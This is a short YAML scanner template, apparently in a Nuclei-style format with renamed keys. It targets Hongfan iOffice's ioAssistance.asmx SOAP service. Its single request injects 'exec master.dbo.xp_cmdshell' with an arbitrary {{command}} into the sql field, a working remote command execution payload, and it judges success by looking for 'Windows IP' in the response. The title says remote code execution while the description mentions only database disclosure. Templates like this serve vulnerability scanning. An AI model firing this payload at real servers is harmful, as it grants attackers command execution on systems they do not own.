id: hongfan-ioffice-rce
brief:
    title: Hongfan OA ioAssistance.asmx - Remote Code Execution
    by: SleepingBag945
    level: high
    about: There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital Edition, which can be exploited by attackers to obtain sensitive database information.
    label:
        - hongfan
        - oa
        - sqli
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/ioffice/prg/set/wss/ioAssistance.asmx'
      head:
        Content-Type: text/xml; charset=utf-8
      body: |-
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
              <sql>exec master.dbo.xp_cmdshell '{{command}}'</sql>
            </GetLoginedEmpNoReadedInf>
          </soap:Body>
        </soap:Envelope>
      signs:
        - "on": word
          has:
            - Windows IP
          in: body
        - "on": word
          has:
            - text/xml
          in: header
          need: all
        - "on": status
          status:
            - 200
